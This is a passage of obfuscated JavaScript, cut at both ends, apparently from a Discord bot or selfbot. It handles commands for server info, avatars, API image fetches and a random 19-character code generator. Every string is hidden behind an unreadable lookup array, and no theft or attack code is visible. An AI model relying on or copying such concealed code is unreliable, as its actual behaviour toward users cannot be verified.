_0x74d2x12[_0xa42d[323]]}${_0xa42d[324]}${bot[_0xa42d[321]]}${_0xa42d[325]}`)[_0xa42d[107]](image?image:_0xa42d[106])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102]);_0x74d2x1f[_0xa42d[114]](_0x74d2x18)}else {_0x74d2x1f[_0xa42d[114]](stripIndents`${_0xa42d[327]}${_0x74d2x1f[_0xa42d[323]]- _0x74d2x12[_0xa42d[323]]}${_0xa42d[328]}${bot[_0xa42d[321]]}${_0xa42d[329]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[330]}`)}})};if(_0x74d2x15=== _0xa42d[332]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[_0xa42d[177]](_0xa42d[23])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[276])};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[110]](_0x74d2x16[_0xa42d[177]](_0xa42d[23]))[_0xa42d[107]](image?image:_0xa42d[335])[_0xa42d[105]](color?color:_0xa42d[334])[_0xa42d[103]](footer?footer:_0xa42d[333]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[160]}${_0x74d2x16[_0xa42d[177]](_0xa42d[23])}${_0xa42d[160]}`)}};if(_0x74d2x15=== _0xa42d[146]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x3a=_0x74d2x12[_0xa42d[99]][_0xa42d[186]][_0xa42d[97]]()|| _0x74d2x12[_0xa42d[85]]|| bot[_0xa42d[186]][_0xa42d[184]](_0x74d2x16[0]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x3a[_0xa42d[245]])};if(_0x74d2x15=== _0xa42d[336]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x12[_0xa42d[81]]){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[337])};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[339]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[340]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[341]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[342]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[343]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[344]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[345]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[346]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[347]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[348]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[349]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[350]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[351]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[352]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[353]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[354]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[355]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[356]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[357]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[358]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[359]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[360]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[361]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[362]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[338]]=== _0xa42d[363]){_0x74d2x12[_0xa42d[81]][_0xa42d[338]]= _0xa42d[364]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[365]]=== _0xa42d[366]){_0x74d2x12[_0xa42d[81]][_0xa42d[365]]= _0xa42d[130]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[365]]=== _0xa42d[367]){_0x74d2x12[_0xa42d[81]][_0xa42d[365]]= _0xa42d[368]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[365]]=== _0xa42d[369]){_0x74d2x12[_0xa42d[81]][_0xa42d[365]]= _0xa42d[370]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[365]]=== _0xa42d[371]){_0x74d2x12[_0xa42d[81]][_0xa42d[365]]= _0xa42d[372]};if(_0x74d2x12[_0xa42d[81]][_0xa42d[365]]=== _0xa42d[373]){_0x74d2x12[_0xa42d[81]][_0xa42d[365]]= _0xa42d[374]};const _0x74d2x17=_0x74d2x12[_0xa42d[81]][_0xa42d[98]][_0xa42d[97]](20)[_0xa42d[286]]((_0x74d2x3b)=>{return _0x74d2x3b})[_0xa42d[177]](_0xa42d[375]);const _0x74d2x3c=_0x74d2x12[_0xa42d[81]][_0xa42d[98]][_0xa42d[286]]((_0x74d2x3b)=>{return _0x74d2x3b})[_0xa42d[177]](_0xa42d[375]);const _0x74d2x3d=_0x74d2x12[_0xa42d[81]][_0xa42d[98]][_0xa42d[376]]- 20;const _0x74d2x3e=_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[282]]((_0x74d2x3f)=>{return _0x74d2x3f[_0xa42d[378]][_0xa42d[377]]== _0xa42d[379]})[_0xa42d[376]];const _0x74d2x40=_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[282]]((_0x74d2x3f)=>{return _0x74d2x3f[_0xa42d[378]][_0xa42d[377]]== _0xa42d[381]})[_0xa42d[376]];const _0x74d2x41=_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[282]]((_0x74d2x3f)=>{return _0x74d2x3f[_0xa42d[378]][_0xa42d[377]]== _0xa42d[382]})[_0xa42d[376]];const _0x74d2x42=_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[282]]((_0x74d2x3f)=>{return _0x74d2x3f[_0xa42d[378]][_0xa42d[377]]== _0xa42d[383]})[_0xa42d[376]];const _0x74d2x43=_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[282]]((_0x74d2x3f)=>{return _0x74d2x3f[_0xa42d[378]][_0xa42d[377]]== _0xa42d[384]})[_0xa42d[376]];const _0x74d2x44=_0x74d2x12[_0xa42d[81]][_0xa42d[387]][_0xa42d[282]]((_0x74d2x45)=>{return _0x74d2x45[_0xa42d[385]]== _0xa42d[386]})[_0xa42d[376]];const _0x74d2x46=_0x74d2x12[_0xa42d[81]][_0xa42d[387]][_0xa42d[282]]((_0x74d2x45)=>{return _0x74d2x45[_0xa42d[385]]== _0xa42d[388]})[_0xa42d[376]];const _0x74d2x47=_0x74d2x12[_0xa42d[81]][_0xa42d[387]][_0xa42d[282]]((_0x74d2x45)=>{return _0x74d2x45[_0xa42d[385]]== _0xa42d[389]})[_0xa42d[376]];const _0x74d2x48=_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[282]]((_0x74d2x35)=>{return _0x74d2x35[_0xa42d[53]][_0xa42d[87]]})[_0xa42d[376]];const _0x74d2x49=_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[282]]((_0x74d2x35)=>{return _0x74d2x35[_0xa42d[53]]})[_0xa42d[376]]- _0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[282]]((_0x74d2x35)=>{return _0x74d2x35[_0xa42d[53]][_0xa42d[87]]})[_0xa42d[376]];if(enabled=== true){let _0x74d2x4a= new Discord.RichEmbed()[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[112]](`${_0xa42d[20]}${_0x74d2x12[_0xa42d[81]][_0xa42d[45]]}${_0xa42d[429]}`)[_0xa42d[107]](_0x74d2x12[_0xa42d[81]][_0xa42d[428]])[_0xa42d[391]](_0xa42d[427],_0x74d2x12[_0xa42d[81]][_0xa42d[45]],true)[_0xa42d[391]](_0xa42d[425],_0x74d2x12[_0xa42d[81]][_0xa42d[426]],true)[_0xa42d[391]](_0xa42d[421],`${_0xa42d[422]}${_0x74d2x12[_0xa42d[81]][_0xa42d[423]]}${_0xa42d[424]}`,true)[_0xa42d[391]](_0xa42d[418],`${_0xa42d[393]}${_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[376]][_0xa42d[124]]()}${_0xa42d[419]}${_0x74d2x49[_0xa42d[124]]()}${_0xa42d[420]}${_0x74d2x48[_0xa42d[124]]()}${_0xa42d[397]}`,true)[_0xa42d[391]](_0xa42d[412],`${_0xa42d[413]}${_0x74d2x3e[_0xa42d[124]]()}${_0xa42d[414]}${_0x74d2x40[_0xa42d[124]]()}${_0xa42d[415]}${_0x74d2x41[_0xa42d[124]]()}${_0xa42d[416]}${_0x74d2x42[_0xa42d[124]]()}${_0xa42d[417]}${_0x74d2x43[_0xa42d[124]]()}${_0xa42d[397]}`,true)[_0xa42d[391]](_0xa42d[411],_0x74d2x12[_0xa42d[81]][_0xa42d[338]],true)[_0xa42d[391]](_0xa42d[405],moment(_0x74d2x12[_0xa42d[81]][_0xa42d[407]])[_0xa42d[28]](_0xa42d[406])+ _0xa42d[408]+ moment(_0x74d2x12[_0xa42d[81]][_0xa42d[407]])[_0xa42d[410]]()[_0xa42d[409]](),true)[_0xa42d[391]](_0xa42d[404],_0x74d2x12[_0xa42d[81]][_0xa42d[61]],true)[_0xa42d[391]](_0xa42d[402],_0x74d2x12[_0xa42d[81]][_0xa42d[403]],true)[_0xa42d[391]](_0xa42d[400],_0x74d2x12[_0xa42d[81]][_0xa42d[401]],true)[_0xa42d[391]](_0xa42d[398],_0x74d2x12[_0xa42d[81]][_0xa42d[399]][_0xa42d[376]],true)[_0xa42d[391]](_0xa42d[392],`${_0xa42d[393]}${_0x74d2x12[_0xa42d[81]][_0xa42d[387]][_0xa42d[376]][_0xa42d[124]]()}${_0xa42d[394]}${_0x74d2x44[_0xa42d[124]]()}${_0xa42d[395]}${_0x74d2x46[_0xa42d[124]]()}${_0xa42d[396]}${_0x74d2x47[_0xa42d[124]]()}${_0xa42d[397]}`,true)[_0xa42d[391]](_0xa42d[390],_0x74d2x12[_0xa42d[81]][_0xa42d[365]],true);if(_0x74d2x12[_0xa42d[81]][_0xa42d[98]][_0xa42d[376]]< 20){_0x74d2x4a[_0xa42d[391]](`${_0xa42d[26]}${_0x74d2x12[_0xa42d[81]][_0xa42d[98]][_0xa42d[376]][_0xa42d[124]]()}${_0xa42d[430]}`,_0x74d2x3c)}else {_0x74d2x4a[_0xa42d[391]](`${_0xa42d[26]}${_0x74d2x12[_0xa42d[81]][_0xa42d[98]][_0xa42d[376]][_0xa42d[124]]()}${_0xa42d[430]}`,_0x74d2x17+ `${_0xa42d[431]}${_0x74d2x3d}${_0xa42d[432]}`)};_0x74d2x4a[_0xa42d[433]]();_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x4a)}else {_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[434]}${_0x74d2x12[_0xa42d[81]][_0xa42d[45]]}${_0xa42d[435]}${_0x74d2x12[_0xa42d[81]][_0xa42d[426]]}${_0xa42d[436]}${_0x74d2x12[_0xa42d[81]][_0xa42d[437]][_0xa42d[53]][_0xa42d[59]]}${_0xa42d[438]}${_0x74d2x12[_0xa42d[81]][_0xa42d[380]][_0xa42d[376]][_0xa42d[124]]()}${_0xa42d[439]}${_0x74d2x49[_0xa42d[124]]()}${_0xa42d[440]}${_0x74d2x48[_0xa42d[124]]()}${_0xa42d[441]}${_0x74d2x3e[_0xa42d[124]]()}${_0xa42d[442]}${_0x74d2x40[_0xa42d[124]]()}${_0xa42d[443]}${_0x74d2x41[_0xa42d[124]]()}${_0xa42d[444]}${_0x74d2x42[_0xa42d[124]]()}${_0xa42d[445]}${_0x74d2x43[_0xa42d[124]]()}${_0xa42d[446]}${_0x74d2x12[_0xa42d[81]][_0xa42d[338]]}${_0xa42d[447]}${moment(_0x74d2x12[_0xa42d[81]][_0xa42d[407]])[_0xa42d[28]](_0xa42d[406])}${_0xa42d[408]}${moment(_0x74d2x12[_0xa42d[81]][_0xa42d[407]])[_0xa42d[410]]()[_0xa42d[409]]()}${_0xa42d[448]}${_0x74d2x12[_0xa42d[81]][_0xa42d[61]]}${_0xa42d[449]}${_0x74d2x12[_0xa42d[81]][_0xa42d[403]]}${_0xa42d[450]}${_0x74d2x12[_0xa42d[81]][_0xa42d[401]]}${_0xa42d[451]}${_0x74d2x12[_0xa42d[81]][_0xa42d[399]][_0xa42d[376]]}${_0xa42d[452]}${_0x74d2x12[_0xa42d[81]][_0xa42d[387]][_0xa42d[376]][_0xa42d[124]]()}${_0xa42d[453]}${_0x74d2x44[_0xa42d[124]]()}${_0xa42d[454]}${_0x74d2x46[_0xa42d[124]]}${_0xa42d[455]}${_0x74d2x47[_0xa42d[124]]()}${_0xa42d[456]}${_0x74d2x12[_0xa42d[81]][_0xa42d[365]]}${_0xa42d[457]}${_0x74d2x12[_0xa42d[81]][_0xa42d[98]][_0xa42d[376]][_0xa42d[124]]()}${_0xa42d[20]}${footer?`${_0xa42d[159]}${footer}${_0xa42d[20]}`:_0xa42d[102]}${_0xa42d[160]}`)}};if(_0x74d2x15=== _0xa42d[458]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[459])};if(_0x74d2x15=== _0xa42d[177]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x4b=_0x74d2x16[0];if(!_0x74d2x4b){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[460])};bot[_0xa42d[53]][_0xa42d[462]](_0x74d2x4b)[_0xa42d[285]]((_0x74d2x36)=>{return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[21])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[461])}${_0xa42d[20]}`)})};if(_0x74d2x15=== _0xa42d[463]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};function _0x74d2x4c(){let _0x74d2x2a=_0xa42d[20];let _0x74d2x4d=_0xa42d[464];for(var _0x74d2x4e=0;_0x74d2x4e< 19;_0x74d2x4e++){_0x74d2x2a= _0x74d2x2a+ _0x74d2x4d[_0xa42d[465]](Math[_0xa42d[197]](Math[_0xa42d[195]]()* _0x74d2x4d[_0xa42d[196]]))};return _0x74d2x2a}_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[466]}${_0x74d2x4c()}${_0xa42d[20]}`)};if(_0x74d2x15=== _0xa42d[467]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const {body}= await superagent[_0xa42d[184]](`${_0xa42d[468]}`);if(!body){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[185])};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[470])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[248]](body[_0xa42d[469]]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {let _0x74d2x4f= new Discord.Attachment(body[_0xa42d[469]],_0xa42d[471]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x4f)}};if(_0x74d2x15=== _0xa42d[472]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const {body}= await superagent[_0xa42d[184]](`${_0xa42d[473]}`);if(!body){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[185])};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[474])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[248]](body[_0xa42d[469]]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {let _0x74d2x4f= new Discord.Attachment(body[_0xa42d[469]],_0xa42d[475]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x4f)}};if(_0x74d2x15=== _0xa42d[476]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const {body}= await superagent[_0xa42d[184]](`${_0xa42d[477]}`);if(!body){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[185])};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[112]](_0xa42d[478])[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[248]](body[_0xa42d[469]]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {let _0x74d2x4f= new Discord.Attachment(body[_0xa42d[469]],_0xa42d[479]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x4f)}};if(_0x74d2x15=== _0xa42d[480]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const {body}= await superagent[_0xa42d[184]](`${_0xa42d[481]}`);if(!body){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[185])};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](body[_0xa42d[482]])};if(_0x74d2x15=== _0xa42d[483]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const {body}= await superagent[_0xa42d[184]](`${_0xa42d[484]}`);if(!body){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[185])};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](body[_0xa42d[482]])};if(_0x74d2x15=== _0xa42d[485]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const {body}= await superagent[_0xa42d[184]](`${_0xa42d[486]}`);if(!body){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[185])};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](body[_0xa42d[482]])};if(_0x74d2x15=== _0xa42d[487]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x3f=_0x74d2x12[_0xa42d[99]][_0xa42d[186]][_0xa42d[97]]();if(!_0x74d2x3f){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[488])};const {body}= await superagent[_0xa42d[184]](`${_0xa42d[489]}`);if(!body){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[185])};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[110]](`${_0xa42d[20]}${_0x74d2x12[_0xa42d[85]]}${_0xa42d[490]}${_0x74d2x3f}${_0xa42d[20]}`)[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[248]](body[_0xa42d[469]]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {let _0x74d2x4f= new Discord.Attachment(body[_0xa42d[469]],_0xa42d[491]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[20]}${_0x74d2x12[_0xa42d[85]][_0xa42d[52]]}${_0xa42d[490]}${_0x74d2x3f[_0xa42d[52]]}${_0xa42d[20]}`,_0x74d2x4f)}};if(_0x74d2x15=== _0xa42d[492]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x3f=_0x74d2x12[_0xa42d[99]][_0xa42d[186]][_0xa42d[97]]();if(!_0x74d2x3f){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[488])};const {body}= await superagent[_0xa42d[184]](`${_0xa42d[493]}`);if(!body){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[185])};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[110]](`${_0xa42d[20]}${_0x74d2x12[_0xa42d[85]]}${_0xa42d[494]}${_0x74d2x3f}${_0xa42d[20]}`)[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[248]](body[_0xa42d[469]]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {let _0x74d2x4f= new Discord.Attachment(body[_0xa42d[469]],_0xa42d[495]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[20]}${_0x74d2x12[_0xa42d[85]][_0xa42d[52]]}${_0xa42d[494]}${_0x74d2x3f[_0xa42d[52]]}${_0xa42d[20]}`,_0x74d2x4f)}};if(_0x74d2x15=== _0xa42d[496]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const _0x74d2x3f=_0x74d2x12[_0xa42d[99]][_0xa42d[186]][_0xa42d[97]]();if(!_0x74d2x3f){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[488])};const {body}= await superagent[_0xa42d[184]](`${_0xa42d[497]}`);if(!body){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[185])};if(enabled=== true){let _0x74d2x18= new Discord.RichEmbed()[_0xa42d[110]](`${_0xa42d[20]}${_0x74d2x12[_0xa42d[85]]}${_0xa42d[498]}${_0x74d2x3f}${_0xa42d[20]}`)[_0xa42d[105]](color?color:_0xa42d[104])[_0xa42d[103]](footer?footer:_0xa42d[102])[_0xa42d[248]](body[_0xa42d[469]]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0x74d2x18)}else {let _0x74d2x4f= new Discord.Attachment(body[_0xa42d[469]],_0xa42d[499]);_0x74d2x12[_0xa42d[83]][_0xa42d[101]](`${_0xa42d[20]}${_0x74d2x12[_0xa42d[85]][_0xa42d[52]]}${_0xa42d[500]}${_0x74d2x3f[_0xa42d[52]]}${_0xa42d[20]}`,_0x74d2x4f)}};if(_0x74d2x15=== _0xa42d[501]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const {body}= await superagent[_0xa42d[184]](_0xa42d[183]);if(!body){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[185])};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](body[_0xa42d[224]])};if(_0x74d2x15=== _0xa42d[502]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};const {body}= await superagent[_0xa42d[184]](_0xa42d[503]);if(!body){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[185])};if(enabled=== true){let _0x74d2x18= new 